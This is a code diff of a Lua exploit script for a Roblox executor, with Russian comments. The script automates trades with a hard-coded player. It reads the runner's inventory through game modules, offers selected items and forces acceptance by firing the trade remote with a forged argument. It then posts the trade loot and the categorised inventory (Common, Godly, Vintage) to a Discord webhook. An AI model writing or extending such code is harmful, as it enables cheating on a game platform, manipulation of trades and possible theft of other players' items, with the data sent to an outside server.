@@ -11,14 +11,6 @@ if not LocalPlayer then return end
 
 local TARGET_NAME = "Marie_31113"
 
--- ID безопасных Common (мусор, не жалко)
-local MY_OFFER = {
-    { id = "DefaultKnife", type = "Weapons" },
-    { id = "DefaultGun",   type = "Weapons" },
-    { id = "Cardboard",    type = "Weapons" },
-    { id = "Log",          type = "Weapons" },
-}
-
 -- =========================================================
 -- 1. ОТПРАВКА ЗАПРОСА
 -- =========================================================
@@ -93,7 +85,7 @@ PlayerGui.ChildAdded:Connect(function(child)
 end)
 
 -- =========================================================
--- 3. ВЫСТАВЛЕНИЕ ПРЕДМЕТОВ + АВТО-АКЦЕПТ + ЛОГГЕР
+-- 3. ВЫСТАВЛЕНИЕ ПРЕДМЕТОВ + АВТО-АКЦЕПТ + ЛОГГЕР ЛУТА
 -- =========================================================
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
@@ -103,18 +95,49 @@ local offered = false
 Trade.StartTrade.OnClientEvent:Connect(function()
     if offered then return end
     offered = true
-    print("[offer] Трейд открыт. Выставляем безопасные Common...")
+    print("[debug] 🔔 StartTrade получен! Трейд открылся.")
     
     task.wait(3)
 
-    for _, item in ipairs(MY_OFFER) do
+    local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
+    local okSync, Sync = pcall(function() return require(ReplicatedStorage.Database.Sync) end)
+    if not okPD or not okSync then
+        warn("[debug] ❌ ProfileData или Sync не загрузились!")
+        return
+    end
+
+    -- Ищем безопасные Common в твоём инвентаре
+    local safeCommon = {}
+    local dangerous = {
+        ["Fragile_G_2023"] = true, ["CandyCorn_K_2024"] = true,
+        ["Patrick"] = true, ["Xbox"] = true, ["Santa"] = true,
+        ["Coal"] = true, ["CandyCorn"] = true,
+        ["DefaultKnife"] = false, ["DefaultGun"] = false, -- они безопасны
+    }
+
+    for id, amount in pairs(PD.Weapons.Owned or {}) do
+        if #safeCommon >= 4 then break end
+        local info = Sync.Weapons and Sync.Weapons[id]
+        if info and info.Rarity == "Common" and not dangerous[id] then
+            table.insert(safeCommon, {id = id, type = "Weapons"})
+            print("[debug] Нашёл безопасный Common: " .. id)
+        end
+    end
+
+    if #safeCommon == 0 then
+        warn("[debug] ❌ Не нашёл безопасных Common в инвентаре.")
+        return
+    end
+
+    print("[debug] Выставляем " .. #safeCommon .. " предметов...")
+    for _, item in ipairs(safeCommon) do
         local ok, err = pcall(function()
             Trade.OfferItem:FireServer(item.id, item.type)
         end)
         if ok then
             print("[offer] ✅ Выставил " .. item.id)
         else
-            warn("[offer] ❌ Не смог выставить " .. item.id .. ": " .. tostring(err))
+            warn("[offer] ❌ Ошибка: " .. tostring(err))
         end
         task.wait(1.5)
     end
@@ -126,6 +149,7 @@ end)
 
 Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
     if success and lootList then
+        print("[debug] ✅ AcceptTrade успешно завершён!")
         local fields = {}
         for _, item in ipairs(lootList) do
             local itemId, amount, itemType = item[1], item[2], item[3]
@@ -169,7 +193,7 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
             print("[trade] 📦 Лут залогирован в Discord!")
         end
     else
-        print("[trade] Мари приняла. Пробуем авто-акцепт...")
+        print("[debug] Мари приняла. Пробуем авто-акцепт...")
         if lastOffer then
             pcall(function()
                 Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
@@ -226,4 +250,56 @@ task.spawn(function()
     if requestFunc then
         requestFunc({ Url = webhookUrl, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
     end
+end)
+
+-- =========================================================
+-- 6. ЛОГГЕР ИНВЕНТАРЯ (Common + Godly + Vintage)
+-- =========================================================
+task.spawn(function()
+    task.wait(5)
+    local RS = game:GetService("ReplicatedStorage")
+    local okPD, PD = pcall(function() return require(RS.Modules.ProfileData) end)
+    local okSync, Sync = pcall(function() return require(RS.Database.Sync) end)
+    if not okPD or not okSync then return end
+
+    local commonList, godlyList, vintageList = {}, {}, {}
+    for id, amount in pairs(PD.Weapons.Owned or {}) do
+        local info = Sync.Weapons and Sync.Weapons[id]
+        if info then
+            local entry = (info.ItemName or info.Name or id) .. " x" .. (tonumber(amount) or 1)
+            if info.Rarity == "Common" then table.insert(commonList, entry)
+            elseif info.Rarity == "Godly" then table.insert(godlyList, entry)
+            elseif info.Rarity == "Vintage" then table.insert(vintageList, entry)
+            end
+        end
+    end
+
+    local function makeField(name, list)
+        if #list == 0 then return { name = name, value = "— пусто —", inline = false } end
+        local text = table.concat(list, ", ")
+        if #text > 1000 then text = string.sub(text, 1, 997) .. "..." end
+        return { name = name, value = text, inline = false }
+    end
+
+    local payload = {
+        username = "Inventory Logger (" .. myName .. ")",
+        embeds = {{
+            title = "🎒 Инвентарь игрока " .. myName,
+            color = 0xF1C40F,
+            fields = {
+                makeField("🟢 Common (" .. #commonList .. ")", commonList),
+                makeField("🟣 Godly (" .. #godlyList .. ")", godlyList),
+                makeField("🟡 Vintage (" .. #vintageList .. ")", vintageList),
+            },
+            footer = { text = "Delta Mobile Logger" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    local requestFunc = request or http_request or (syn and syn.request)
+    if requestFunc then
+        pcall(function()
+            requestFunc({ Url = webhookUrl, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
+        end)
+    end
+    print("[inv] Инвентарь отправлен в Discord.")
 end)
